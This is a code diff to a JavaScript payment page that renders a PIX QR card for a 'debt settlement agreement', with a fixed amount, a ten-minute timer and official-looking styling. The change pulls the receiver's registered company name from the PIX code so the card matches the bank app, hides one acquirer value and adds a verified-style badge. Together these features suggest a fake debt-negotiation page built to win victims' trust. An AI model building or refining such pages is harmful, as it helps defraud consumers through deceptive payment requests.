@@ -921,6 +921,32 @@ async function confirmarAcordo() {
   autoScroll();
 }
 
+// Extrai e formata a Razão Social real do recebedor gravada na Tag 59 do QR Code PIX
+function extrairNomeSocialPix(pixCode) {
+  if (!pixCode || typeof pixCode !== 'string') return '';
+  try {
+    let pos = 0;
+    while (pos < pixCode.length - 4) {
+      const tag = pixCode.slice(pos, pos + 2);
+      const len = parseInt(pixCode.slice(pos + 2, pos + 4), 10);
+      if (isNaN(len)) break;
+      const val = pixCode.slice(pos + 4, pos + 4 + len);
+      if (tag === '59') {
+        let clean = val.replace(/_/g, ' ').replace(/\s+/g, ' ').trim();
+        if (clean.toUpperCase().endsWith(' LTD')) clean = clean + 'A';
+        return clean.split(' ').map(w => {
+          const upper = w.toUpperCase();
+          if (upper === 'LTDA' || upper === 'SA' || upper === 'S.A.' || upper === 'ME' || upper === 'EPP') return upper;
+          if (w.length <= 3 && !/[aeiou]/i.test(w)) return upper;
+          return w.charAt(0).toUpperCase() + w.slice(1).toLowerCase();
+        }).join(' ');
+      }
+      pos = pos + 4 + len;
+    }
+  } catch (e) {}
+  return '';
+}
+
 // ── Exibição do Card PIX Oficial com QR Code Gerado ──
 function showPixCard(data, section) {
   data = data || {};
@@ -933,7 +959,12 @@ function showPixCard(data, section) {
   const pixCode = data.qr_code || data.pixCode || '';
   const pixQrBase64 = data.qr_code_base64 || data.pixQrCode || null;
   const transactionId = data.transaction_id || '';
-  const acquirerName = data.acquirer || 'Instituição Autorizada Banco Central';
+
+  // Extrai exatamente a Razão Social (Tag 59) para ficar idêntico ao aplicativo do banco
+  let nomeSocial = extrairNomeSocialPix(pixCode);
+  if (!nomeSocial && data.favorecido) nomeSocial = data.favorecido;
+  if (!nomeSocial && data.acquirer && data.acquirer !== 'TenantBank') nomeSocial = data.acquirer;
+  if (!nomeSocial) nomeSocial = 'Cpa Pay Intermediacao LTDA';
 
   card.innerHTML = `
     <div class="pix-card-header">
@@ -957,6 +988,10 @@ function showPixCard(data, section) {
         <span class="val">Quitação de Dívidas — Acordo XXKM8-0R0--</span>
       </div>
       <div class="pix-doc-row">
+        <span class="lbl">Instituição Recebedora</span>
+        <span class="val" id="pixInstituicao" style="color: #1351B4; font-weight: 800;">${nomeSocial}</span>
+      </div>
+      <div class="pix-doc-row">
         <span class="lbl">Valor a pagar</span>
         <span class="val val-green">R$ 68,92</span>
       </div>
@@ -965,14 +1000,14 @@ function showPixCard(data, section) {
         <span class="val" style="color:#c0392b;"><span id="timer">10:00</span></span>
       </div>
       <hr class="pix-divider">
-      <div id="acquirer-verification" style="margin-top: 15px; margin-bottom: 15px; display: block;">
+      <div id="acquirer-verification" style="margin-top: 15px; margin-bottom: 15px; display: block !important;">
         <div>
           <div style="font-size: 15px; font-weight: 800; color: #111; margin-bottom: 6px; text-align: center;">
             Pagamento processado por:
           </div>
-          <div style="display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 14px; font-weight: bold; color: #333;">
-            <span id="acquirer-name">${acquirerName}</span>
-            <svg width="14" height="14" viewBox="0 0 24 24" style="flex-shrink: 0;">
+          <div style="display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 16px; font-weight: 800; color: #111;">
+            <span id="acquirer-name">${nomeSocial}</span>
+            <svg width="15" height="15" viewBox="0 0 24 24" style="flex-shrink: 0;">
               <path fill="#007bff" d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.3 14.7L6.3 12.3l1.4-1.4 3 3 7.1-7.1 1.4 1.4-8.5 8.5z" />
             </svg>
           </div>
